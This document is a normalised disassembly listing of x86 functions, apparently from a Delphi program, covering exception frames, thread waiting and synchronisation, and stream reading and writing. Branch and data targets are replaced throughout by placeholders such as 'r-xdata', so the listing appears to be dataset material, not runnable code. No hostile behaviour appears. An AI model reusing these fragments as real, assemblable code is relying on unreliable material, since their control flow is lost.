sub_418ec0
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_418efc
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_418cd0
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418f03
lea eax [ ebp - 0x4 ]
call sub_404074
retn
sub_418f08
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
jmp r-xdata
mov eax [ ebx ]
call sub_417108
test al al
je r-xdata
mov eax [ ebx ]
call sub_418fbc
mov eax [ ebx ]
call sub_418074
pop ebx
pop ebp
retn
sub_418f30
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
call sub_417470
mov edx [ ebp - 0x4 ]
imul edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4193b4
pop ebx
pop ecx
pop ebp
retn
sub_418f60
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
jmp r-xdata
mov eax [ ebx ]
call sub_417108
test al al
je r-xdata
mov eax [ ebx ]
call sub_41744c
add al 0xfe
sub al 0x3
jae r-xdata
mov eax [ ebx ]
call sub_418074
pop ebx
pop ebp
retn
mov eax [ ebx ]
mov edx 0x1
call sub_4193b4
jmp r-xdata
mov eax [ ebx ]
call sub_418fbc
mov eax [ ebx ]
call sub_417108
test al al
je r-xdata
mov eax [ ebx ]
call sub_419158
mov eax [ ebx ]
call sub_418074
sub_418fbc
push ebp
mov ebp esp
add esp 0xfffffff8
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41914b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_418eac
and eax 0x7f
cmp eax 0x14
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419152
lea eax [ ebp - 0x8 ]
call sub_404074
retn
jmp [ eax * 4 + jump_table_418ff3 ]
push ebp
call sub_418f08
pop ecx
jmp r-xdata
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_4193b4
jmp r-xdata
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_4193b4
jmp r-xdata
mov edx 0x4
mov eax [ ebp - 0x4 ]
call sub_4193b4
jmp r-xdata
mov edx 0xa
mov eax [ ebp - 0x4 ]
call sub_4193b4
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_418cd0
jmp r-xdata
push ebp
mov eax 0x1
call sub_418f30
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_418ec0
jmp r-xdata
push ebp
mov eax 0x1
call sub_418f30
pop ecx
jmp r-xdata
push ebp
call sub_418f60
pop ecx
jmp r-xdata
mov edx 0x4
mov eax [ ebp - 0x4 ]
call sub_4193b4
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_4193b4
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_4193b4
jmp r-xdata
push ebp
mov eax 0x2
call sub_418f30
pop ecx
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_4193b4
jmp r-xdata
push ebp
mov eax 0x1
call sub_418f30
pop ecx
sub_419158
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_419195
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_418cd0
mov eax ebx
call sub_418fbc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41919c
lea eax [ ebp - 0x4 ]
call sub_404074
retn
sub_4191a0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_419238
push [ fs : eax ]
mov [ fs : eax ] esp
test dl dl
je r-xdata
mov eax ebx
call sub_417108
test al al
je r-xdata
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x1 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x24 ]
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_418cd0
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_418cd0
jmp r-xdata
mov eax ebx
call sub_419158
mov eax ebx
call sub_418074
jmp r-xdata
mov eax ebx
call sub_417108
test al al
je r-xdata
mov dl 0x1
mov eax ebx
call sub_4191a0
mov eax ebx
call sub_418074
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41923f
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_404098
retn
sub_419248
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4192ed
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
mov edx esi
call sub_40410c
xor eax eax
mov [ ebp - 0x4 ] eax
mov esi [ ebx + 0x1c ]
test esi esi
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_41a5ec
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4192f4
lea eax [ ebp - 0x8 ]
call sub_404074
retn
cmp [ ebx + 0x52 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
push edi
lea eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b734
call sub_403a2c
sub_419318
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
cmp [ eax + 0x42 ] 0x0
je r-xdata
mov edx [ esi ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop edi
pop esi
pop ebx
retn
push esi
mov edi eax
mov ecx ebx
mov edx eax
mov eax [ edi + 0x44 ]
call [ edi + 0x40 ]
sub_419340
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov ecx esi
mov edx [ ebx + 0x18 ]
mov eax ebx
call sub_4173a0
mov [ esp ] eax
cmp [ esp ] 0x0
jne r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
push esp
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
mov eax [ ebx + 0x1c ]
cmp eax [ ebx + 0x18 ]
je r-xdata
mov eax esi
call sub_413484
mov edx [ r-xdata ]
mov eax [ esp ]
call sub_4034cc
test al al
jne r-xdata
mov ecx esi
mov edx [ ebx + 0x1c ]
mov eax ebx
call sub_4173a0
mov [ esp ] eax
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
sub_4193b4
push ebx
push esi
add esp 0xffffff00
mov ebx edx
mov esi eax
test ebx ebx
jle r-xdata
add esp 0x100
pop esi
pop ebx
retn
cmp ebx 0x100
jle r-xdata
mov edx esp
mov ecx ebx
mov eax esi
call sub_417470
xor ebx ebx
mov edx esp
mov ecx 0x100
mov eax esi
call sub_417470
sub ebx 0x100
jmp r-xdata
test ebx ebx
jg r-xdata
sub_4193fc
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x1c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4195a5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xa
call sub_416fd4
xor eax eax
mov [ ebp - 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_419580
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
call sub_417470
mov eax [ ebp - 0x10 ]
cdq
push edx
push eax
mov eax [ ebp - 0x4 ]
call sub_415f00
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x10 ]
call sub_417470
push 0x400
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_416890
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41955b
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0xc ]
call sub_418d0c
lea edx [ ebp - 0x10 ]
mov ecx 0x4
mov eax [ ebp - 0xc ]
call sub_417470
mov eax [ ebp - 0x10 ]
cdq
push edx
push eax
mov eax [ ebp - 0x8 ]
call sub_415f00
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_417470
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
call sub_410668
test al al
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6f8
call sub_403a2c
lea eax [ ebp - 0x1c ]
call sub_4056e0
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x14 ]
call sub_40d050
test al al
jne r-xdata
mov eax [ ebp - 0x14 ]
mov ax [ eax + 0x4 ]
mov [ ebx ] ax
mov edx ebx
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x1c ]
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419562
mov eax [ ebp - 0xc ]
call sub_4032a0
retn
sub_4195c4
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4197be
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_40ebc4
mov eax [ ebp - 0x4 ]
call sub_41744c
and eax 0x7f
cmp eax 0x14
ja r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6f8
call sub_403a2c
jmp [ eax * 4 + jump_table_419606 ]
mov eax [ ebp - 0x4 ]
call sub_418eac
cmp al 0xd
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_417fbc
mov edx eax
movsx edx dl
mov eax ebx
mov cl 0xff
call sub_40fea0
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_417fbc
mov edx eax
movsx edx dx
mov eax ebx
mov cl 0xfe
call sub_40fea0
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_417fbc
mov edx eax
mov eax ebx
mov cl 0xfc
call sub_40fea0
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_417da0
mov eax ebx
call sub_40ff30
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_417de4
mov eax ebx
call sub_40ff30
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_417e28
mov eax ebx
call sub_40ff58
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_417e78
mov eax ebx
call sub_40ff44
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_418d0c
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_40ff6c
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_418dc8
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_40ff98
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_418eac
cmp al 0x9
sete dl
mov eax ebx
call sub_40ff08
jmp r-xdata
push ebp
lea eax [ ebp - 0x1c ]
call sub_4193fc
pop ecx
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_40eeec
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_418028
push edx
push eax
mov eax ebx
call sub_40fedc
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4197c5
lea eax [ ebp - 0x1c ]
call sub_40ebd8
lea eax [ ebp - 0xc ]
call sub_404754
lea eax [ ebp - 0x8 ]
call sub_404074
retn
mov eax ebx
call sub_410750
jmp r-xdata
sub_4197cc
push esi
push edi
push ebx
mov esi edx
mov ebx ecx
mov edi eax
jmp r-xdata
or ebx ebx
jne r-xdata
mov ecx [ edi + 0xc ]
sub ecx [ edi + 0x10 ]
ja r-xdata
pop ebx
pop edi
pop esi
retn
cmp ecx ebx
jb r-xdata
mov eax edi
call sub_419818
mov ecx [ edi + 0xc ]
sub ebx ecx
push edi
mov eax [ edi + 0x8 ]
add eax [ edi + 0x10 ]
add [ edi + 0x10 ] ecx
mov edi eax
mov edx ecx
shr ecx 0x2
cld
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
mov ecx ebx
sub_419844
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
cmp [ esp ] 0xffffff80
jl r-xdata
cmp [ esp ] 0xffff8000
jl r-xdata
cmp [ esp ] 0x7f
jg r-xdata
mov dl 0x4
mov eax ebx
call sub_4199b4
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_4197cc
cmp [ esp ] 0x7fff
jg r-xdata
mov dl 0x2
mov eax ebx
call sub_4199b4
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_4197cc
pop edx
pop ebx
retn
mov dl 0x3
mov eax ebx
call sub_4199b4
mov edx esp
mov ecx 0x2
mov eax ebx
call sub_4197cc
jmp r-xdata
pop edx
pop ebx
retn
sub_4198c8
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
mov edx edi
call sub_404480
je r-xdata
mov eax esi
call sub_404334
mov [ esp ] eax
cmp [ esp ] 0xff
jg r-xdata
mov eax edi
call sub_404334
mov [ esp ] eax
mov dl 0x14
mov eax ebx
call sub_4199b4
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_4197cc
mov edx edi
mov ecx [ esp ]
mov eax ebx
call sub_4197cc
jmp r-xdata
mov dl 0xc
mov eax ebx
call sub_4199b4
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_4197cc
mov dl 0x6
mov eax ebx
call sub_4199b4
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_4197cc
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov ecx [ esp ]
mov eax ebx
call sub_4197cc
sub_419960
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4199a5
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_405b54
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_4198c8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4199ac
lea eax [ ebp - 0x4 ]
call sub_404074
retn
sub_419a60
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx eax
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
je r-xdata
test ebx ebx
jle r-xdata
call GetCurrentThreadId
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b734
call sub_403a2c
call sub_419a14
mov eax ebx
call sub_419a20
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_419bee
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push rw-data
call InterlockedExchange
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_419bcf
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419bd6
mov eax [ ebp - 0xc ]
call sub_4032a0
retn
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
xor edx edx
mov eax [ ebp - 0xc ]
call sub_413de4
mov [ ebp - 0x8 ] eax
xor edx edx
mov eax [ ebp - 0xc ]
call sub_413cd4
push rw-data
call LeaveCriticalSection
xor eax eax
push ebp
push sub_419b99
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_419b6a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call EnterCriticalSection
retn
sub_419c00
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov bl [ eax + 0xf ]
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] 0x1
call sub_419a3c
test bl bl
je r-xdata
xor eax eax
push ebp
push sub_419c41
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax esi
call sub_40406c
mov eax [ ebp - 0x4 ]
call sub_4032a0
sub_419c46
call sub_40279c
mov edx [ ebp - 0x4 ]
mov [ edx + 0x38 ] eax
call sub_403aa8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov bl [ eax + 0xf ]
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] 0x1
call sub_419a3c
test bl bl
je r-xdata
mov eax esi
call sub_40406c
mov eax [ ebp - 0x4 ]
call sub_4032a0
sub_419ca8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
test dl dl
je r-xdata
mov ebx ecx
mov [ ebp - 0x1 ] dl
mov esi eax
xor eax eax
push ebp
push sub_419d52
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_403270
call sub_419a48
mov [ esi + 0xe ] bl
mov [ esi + 0xc ] bl
push esi
push 0x4
lea eax [ esi + 0x8 ]
push eax
mov ecx sub_419c00
xor edx edx
xor eax eax
call sub_404028
mov ebx eax
mov [ esi + 0x4 ] ebx
test ebx ebx
jne r-xdata
add esp 0xfffffff0
call sub_4035c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419d59
lea eax [ ebp - 0x10 ]
call sub_404074
retn
call GetLastError
lea edx [ ebp - 0x10 ]
call sub_40ae34
mov eax [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b734
call sub_403a2c
sub_419d78
push ebx
push esi
call sub_40362c
mov ebx edx
mov esi eax
cmp [ esi + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
cmp [ esi + 0x10 ] 0x0
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403290
mov eax [ esi + 0x38 ]
call sub_4032a0
call sub_419a54
test bl bl
jle r-xdata
push eax
call CloseHandle
mov eax esi
call sub_41a038
cmp [ esi + 0xc ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403614
mov eax esi
call sub_41a040
mov eax esi
call sub_41a010
sub_419dec
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov ebx edx
xor eax eax
push ebp
push sub_419e5a
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419e61
lea eax [ ebp - 0x14 ]
call sub_404074
retn
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_40ae34
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b734
call sub_403a2c
sub_419ea8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x4 ] edx
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
jne r-xdata
push 0x0
push 0x0
push 0xffffffff
push 0x0
call CreateEventA
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_419fca
push [ fs : eax ]
mov [ fs : eax ] esp
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_419fac
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_413c88
call sub_419a3c
cmp [ rw-data ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov [ rw-data ] eax
pop ebx
mov esp ebp
pop ebp
retn
push rw-data
call LeaveCriticalSection
xor eax eax
push ebp
push sub_419f8d
push [ fs : eax ]
mov [ fs : eax ] esp
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
call WaitForSingleObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419f94
push rw-data
call EnterCriticalSection
retn
mov eax [ ebp - 0xc ]
mov edx [ eax ]
mov eax [ rw-data ]
call [ rw-data ]
sub_419fe8
push ebp
mov ebp esp
mov [ eax + 0x20 ] eax
xor edx edx
mov [ eax + 0x30 ] edx
mov edx [ ebp + 0x8 ]
mov [ eax + 0x28 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x2c ] edx
lea edx [ eax + 0x20 ]
mov eax [ eax ]
call sub_419ea8
pop ebp
retn 0x8
sub_41a010
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x4 ]
push eax
call ResumeThread
mov esi eax
test esi esi
setge dl
mov eax ebx
call sub_419e68
dec esi
jne r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0xe ] 0x0
sub_41a040
push ebx
push esi
add esp 0xffffffd8
mov esi eax
mov eax [ esi + 0x4 ]
mov [ esp + 0x4 ] eax
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
jne r-xdata
push 0xffffffff
mov eax [ esp + 0x8 ]
push eax
call WaitForSingleObject
xor ebx ebx
mov eax [ rw-data ]
mov [ esp + 0x8 ] eax
push 0x40
push 0x3e8
push 0x0
lea eax [ esp + 0x10 ]
push eax
push 0x2
call MsgWaitForMultipleObjects
mov ebx eax
cmp ebx 0xffffffff
setne dl
mov eax esi
call sub_419e68
cmp ebx 0x1
jne r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ esp + 0x1c ]
push eax
call PeekMessageA
test ebx ebx
jne r-xdata
xor eax eax
call sub_419a60
cmp ebx 0x2
jne r-xdata
jmp r-xdata
push esp
mov eax [ esp + 0x8 ]
push eax
call GetExitCodeThread
cmp eax 0x1
sbb edx edx
inc edx
mov eax esi
call sub_419e68
mov eax [ esp ]
add esp 0x28
pop esi
pop ebx
retn
sub_41a0e4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov al [ r-xdata ]
mov [ edi + 0x24 ] al
test esi esi
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax edi
test bl bl
je r-xdata
mov edx edi
mov eax esi
call sub_41a29c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_41a130
push ebx
push esi
push ecx
call sub_40362c
mov [ esp ] dl
mov ebx eax
mov eax ebx
call sub_41a384
cmp [ ebx + 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_41a32c
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
jmp r-xdata
mov dl [ esp ]
and dl 0xfc
mov eax ebx
call sub_414408
cmp [ esp ] 0x0
jle r-xdata
mov edx ebx
call sub_41a2f4
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
pop edx
pop esi
pop ebx
retn
mov eax ebx
call sub_403614
lea eax [ ebx + 0x14 ]
call sub_40d01c
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov edx [ esi + 0x8 ]
dec edx
mov eax esi
call sub_413de4
mov cl 0x1
mov edx ebx
mov esi [ eax ]
call [ esi + 0x10 ]
sub_41a1b4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
cmp eax [ esi + 0x4 ]
je r-xdata
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_413e40
test eax eax
jge r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov [ ebx + 0x14 ] eax
or [ ebx + 0x1c ] 0x100
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_413c88
mov edx ebx
mov eax esi
call sub_41a1b4
sub_41a248
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_413c88
mov [ esi + 0x4 ] ebx
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov [ ebx + 0x10 ] eax
sub_41a274
push ebx
mov ebx eax
xor eax eax
mov [ edx + 0x4 ] eax
mov eax [ ebx + 0x10 ]
call sub_413f80
mov eax [ ebx + 0x10 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
call sub_4032a0
xor eax eax
mov [ ebx + 0x10 ] eax
sub_41a29c
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx edi
mov eax ebx
mov si 0xfff5
call sub_40349c
mov eax [ ebx + 0x8 ]
push eax
xor ecx ecx
mov edx ebx
mov eax edi
mov esi [ eax ]
call [ esi + 0x20 ]
mov edx ebx
mov eax edi
call sub_41a248
mov dl 0x1
mov eax ebx
call sub_41a7bc
test [ edi + 0x1c ] 0x10
je r-xdata
xor ecx ecx
mov edx ebx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x10 ]
pop edi
pop esi
pop ebx
retn
mov cl 0x1
mov dl 0x1
mov eax ebx
call sub_41a76c
sub_41a2f4
push ebx
push esi
push edi
mov ebx edx
mov esi eax
push 0x0
mov ecx [ ebx + 0x8 ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x20 ]
mov cl 0x1
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x10 ]
xor edx edx
mov eax ebx
call sub_41a7bc
mov edx ebx
mov eax esi
call sub_41a274
pop edi
pop esi
pop ebx
retn
sub_41a32c
push ebx
push esi
push edi
mov esi eax
jmp r-xdata
mov ebx [ esi + 0x10 ]
test ebx ebx
jne r-xdata
mov eax ebx
call sub_413ecc
mov edi eax
test [ edi + 0x1d ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
call sub_41a2f4
jmp r-xdata
mov ax [ r-xdata ]
and ax [ esi + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov edx edi
mov eax esi
call sub_41a274
sub_41a384
push ebx
push esi
push edi
mov ebx eax
test [ ebx + 0x1c ] 0x8
